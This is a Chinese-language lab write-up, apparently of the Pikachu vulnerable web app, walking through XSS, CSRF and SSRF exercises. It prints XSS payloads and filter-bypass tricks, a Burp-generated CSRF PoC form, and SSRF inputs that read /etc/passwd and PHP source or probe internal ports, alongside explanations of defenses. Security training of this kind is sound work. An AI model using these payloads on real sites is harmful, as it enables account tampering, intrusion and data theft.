<p>添加返回包里的 token 值，有效载荷选递归搜索</p>
<p><img src="/2021/04/28/pikachu/9.jpg"></p>
<p>成功爆破</p>
<p><img src="/2021/04/28/pikachu/8.jpg"></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>对XSS的熟悉程度取决于对浏览器机制和HTML、JS的了解程度。这部分涉及内容较多，需要多加练习。</p>
<h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>比较好绕过，F12更改输入框maxlength，或者直接在URL中补全&lt;/script&gt;即可。js代码正确即可被浏览器执行。</p>
<p><img src="/2021/04/28/pikachu/10.jpg"></p>
<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>此处同上，只不过URL不显示</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>注入语句会写入数据库中，每次进入都会执行</p>
<p>同上</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM: Document Object Model文档对象模型，DOM型XSS是一种特殊类型的反射型XSS。</p>
<p>当网页到达浏览器，浏览器会为网页创建一个Document object文档对象，然后生成各个子文档对象，其中<strong>每个页面元素对应一个文档对象</strong>，每个文档对象包含属性、方法和事件。</p>
<p>我们可以通过JS脚本对文档对象进行编辑从而修改页面的元素。<strong>客户端脚本程序可以通过DOM来动态修改页面内容，客户端获取DOM中的数据并在本地执行</strong>。基于此，JS脚本就可以用来实现XSS。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">               &lt;script&gt;</span><br><span class="line">                   <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                       <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">                       <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                   <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">               &lt;/script&gt;</span><br><span class="line">               &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">           <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>  然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，而a标签会写到<strong>Id 为 dom</strong>的 div 标签中。</p>
<p>因此通过闭合的方式构造Payload</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(&quot;xss&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/28/pikachu/11.jpg"></p>
<p>DOM型XSS不经过后台交互，前端输入被DOM给获取，通过DOM又在前端输出</p>
<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;</span><br><span class="line">                        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">                        <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                &lt;/script&gt;</span><br><span class="line">                &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line">                &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">                &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;</span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>首先定义一个domxss函数：</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容；</p>
<p>把 “+” 替换为 “ ”（空格），赋值给 xss；</p>
<p>把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中。</p>
<p>与之前DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)</p>
<p>构造的Payload同上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p>为攻击场景，输入的内容不会在当前输出，而是提交到后台。若输入一串js，管理员登录后台管理界面，后台会输出我们提交的内容</p>
<p>输入常见xss一句话，登陆管理员界面即可看到一登陆进来就遭受攻击。</p>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>常见xss一句话输入，被后台过滤，大小写即可绕过。也可用&lt;img src=x onerror=alert(‘xss’)&gt;。</p>
<p>实际场景中，或多或少都会有过滤，但是有些逻辑不严谨，也可被绕过。</p>
<p>绕过思路：</p>
<ul>
<li><strong>前端限制绕过</strong>：直接抓包重放，或修改html前端代码。如反射型XSS(get)中限制输入20个字符。</li>
<li><strong>大小写</strong>：比如<SCRIPT>aLeRT(111)。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。</SCRIPT></li>
<li><strong>双写</strong>：&lt;scri<script>pt>alert(111)</scri</script>pt&gt;。针对后台把<script>标签去掉换，但可能只去掉一次。</li>
<li><strong>注释干扰</strong>：&lt;scri<!--test-->pt&gt;alert(111)&lt;/sc<!--test-->ript&gt;。加上注释后可能可以绕过后台过滤机制。</li>
<li><strong>编码</strong>：后台过滤特殊字符，如<script>标签，但该标签可被各种编码，或许可以绕过。(浏览器会对某些编码进行识别，翻译成正常的标签执行)</li>
</ul>
<blockquote>
<h5 id="浏览器的解码顺序："><a href="#浏览器的解码顺序：" class="headerlink" title="浏览器的解码顺序："></a><strong>浏览器的解码顺序：</strong></h5><p>浏览器的解码顺序和解析顺序不同。浏览器一般的解码顺序是：html解码–&gt;javascript解码–&gt;浏览器的url解码.</p>
<p>这里的url解码和发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p>
</blockquote>
<p> <strong>属性标签不会正常解析URL编码，因此不会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;</p>
<p>将alert(‘xss’)进行URL编码，可以执行吗？</p>
<img src=x onerror=alert%28%27xss%27%29>
</blockquote>
<p><strong>HTML编码可以被浏览器解析，因此会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;将alert(‘xss’)进行HTML编码<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;></p>
</blockquote>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>htmlspecialchars()：<strong>对特殊字符进行转义</strong></p>
<p>  预定义字符包括：</p>
<ul>
<li><p>&amp; 成为 &amp;amp</p>
</li>
<li><p>“ 成为 &amp;quot</p>
</li>
<li><p>‘ 成为 &amp;#039</p>
</li>
<li><p>&lt; 成为 &amp;lt</p>
</li>
<li><p>&gt; 成为 &amp;gt</p>
<p>可用引号类型</p>
</li>
<li><p>ENT_COMPAT：默认，仅编码双引号</p>
</li>
<li><p>ENT_QUOTES：编码双引号和单引号</p>
</li>
<li><p>ENT_NOQUOTES：不编码任何引号</p>
</li>
</ul>
<blockquote>
<p>默认：对输入直接进行过滤。</p>
<p>建议用ENT_QUOTES,对单双引号都进行过滤</p>
</blockquote>
<p>测试，查看htmlspecialchars是否过滤单双引号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">111&#39;&quot;&lt;&gt;&amp;</span><br></pre></td></tr></table></figure>

<p><img src="4.png"></p>
<p>可以对于单引号未进行编码，因此构造Payload:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">q&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>

<p>审计后端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;</span></span><br><span class="line"><span class="comment">//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;&#123;$message&#125;&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;</span></span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt;<span class="subst">&#123;$message&#125;</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于htmlspecialchars默认不处理’，导致可以绕过。</p>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>先来看看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$message=htmlspecialchars($_GET[‘message’],ENT_QUOTES) htmlspecialchars使用ENT_QUOTES，过滤掉单双引号，然后将输入放入a标签的href属性中。a标签的href属性可用javascript协议来执行js。这时候就利用js构造payload:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>思考:</p>
<p>a标签的href属性如果有输出，如何做防范措施呢？</p>
<p>首先仅仅用htmlspecialchars做过滤是不够的。一般有两个逻辑： href用来插入链接，所以我们<strong>首先只允许http,https开头的协议，再进行htmlspecialchars过滤</strong>。</p>
<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>随便输入111，查看网页源码可以发现，输入被放入js中进行判断后输出。</p>
<p>其实<strong>js的payload就是构造闭合</strong>，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//在这构造：$ms=&#x27;1&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;&#x27;;</span></span><br><span class="line">    <span class="keyword">if</span>($ms.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>后台源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;这里讲输入动态的生成到了js中,形成xss</span><br><span class="line">&#x2F;&#x2F;javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?</span><br><span class="line">&#x2F;&#x2F;这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。</span><br><span class="line">&#x2F;&#x2F;所以在JS的输出点应该使用\对特殊字符进行转义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;message&#39;] !&#x3D;null)&#123;</span><br><span class="line">    $jsvar&#x3D;$_GET[&#39;message&#39;];</span><br><span class="line">&#x2F;&#x2F;    $jsvar&#x3D;htmlspecialchars($_GET[&#39;message&#39;],ENT_QUOTES);</span><br><span class="line">    if($jsvar &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">        $html.&#x3D;&quot;&lt;img src&#x3D;&#39;&#123;$PIKA_ROOT_DIR&#125;assets&#x2F;images&#x2F;nbaplayer&#x2F;tmac.jpeg&#39; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;&lt;?php echo $jsvar;?&gt;&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>前端接收，后端通过js接收参数。输出点在js中，通过用户输入动态生成了js代码。使用htmlspecialchars做过滤时，输入会被html实体编码，而js不能再反转化回去。所以<strong>用\在JS中对特殊字符进行转义</strong>。</p>
<p>参考：</p>
<p><a href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>攻击者会伪造一个请求链接，然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p>
<p>判断一个网站是否存在CSRF漏洞，其实就是<strong>判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造</strong>。</p>
<p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>网站如果要防止CSRF攻击，需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
<h2 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h2><p>在修改个人信息处，可以看到URL以明文的形式传输，攻击者可以伪造URL诱骗用户点击来实现攻击。此处我们伪造URL将目标用户的邮箱修改为我们的邮箱。若用户在登陆的状态下点击此伪造的URL，可更改个人信息。伪造的URL如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545454&amp;add&#x3D;Earth&amp;email&#x3D;&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>burp抓包也可以更改：</p>
<p><img src="5.png"></p>
<h2 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h2><p>此时无法像前面一样通过伪造URL来进行攻击，我们可以通过构造恶意站点，将POST请求隐藏在站点中的表单中，然后诱骗用户进行点击，当用户点击后触发表单，数据自然就POST到存在CSRF漏洞的网站，用户的信息则被恶意修改。</p>
<p>burp拦截请求，并生成恶意的网页index.html</p>
<p><img src="12.jpg"></p>
<p>html源码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfpost&#x2F;csrf_post_edit.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;boy&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;phonenum&quot; value&#x3D;&quot;18626545453&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;add&quot; value&#x3D;&quot;Earth&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;hacher&amp;#64;pikachu&amp;#46;com&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;you have been hacked&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure>

<p>当用户在<strong>登录状态</strong>下，访问我们伪造的站点<code>http://192.168.137.1/pikachu/vul/csrf/index.html</code>并点击提交按钮，那么其个人信息将会被恶意修改.</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>在修改个人信息处，添加信息，提交信息，Burp拦截之后可发现，修改信息时会<strong>添加token信息</strong>，以防止CSRF:<br><img src="13.jpg"></p>
<p>CSRF的主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码<code>Token</code>，后台每次都对这个随机码进行验证，则可以有效地防止CSRF</p>
<h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>SSRF形成的原因大都是<strong>由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</strong>，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流: 攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>根据后台使用函数的不同,影响和利用方法也不一样</p>
<p>PHP中以下函数使用不当会导致SSRF:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<p>若一定要通过后台服务器远程对用户指定地址进行资源请求,一定要做好目标地址的过滤。</p>
<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><p>点击累了来读一首诗吧，可看到URL中传了一个url参数。</p>
<p>查看后端源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了httptps外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从前端获取了url请求，curl_init函数会对它进行初始化，然后curl_exec函数执行请求，最终又将请求结果返回到前端。</p>
<p>用百度试一下，可以发现页面显示百度的数据库，说明我们分析正确，前端传入参数，后端通过<strong>curl_exec</strong>去请求百度，最后把请求返回的百度数据返回到前端。<br><img src="6.png"></p>
<p>在test目录下新建一个1.txt，load1.txt文件的地址，可以看到页面加载了1.txt的内容。</p>
<p><img src="7.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;192.168.137.17:22</span><br></pre></td></tr></table></figure>

<p>将url改成内网上的其他主机(http协议)，就可以探测到内网的其他主机ssh等服务端口是否开放。</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><p>与前面相同，都是通过URL上传参数到后台获取信息：</p>
<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span></span><br><span class="line"><span class="comment">//内网请求:http://x.x.x.x/xx.index</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>file_get_contents()：把整个文件读入一个字符串中</p>
<p>此处使用<strong>file_get_contents</strong>函数进行文件的读取执行，<strong>file_get_contents</strong>函数可以对本地文件进行读取，也可以对远程文件进行读取。</p>
<p>当我们按照之前测试百度和1.txt都会成功。</p>
<p>漏洞利用：</p>
<ol>
<li><p>文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></li>
<li><p>读取php源码的base64加密版本，之后解密即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ssrf.php</span><br></pre></td></tr></table></figure></li>
<li><p>内网其他主机的请求</p>
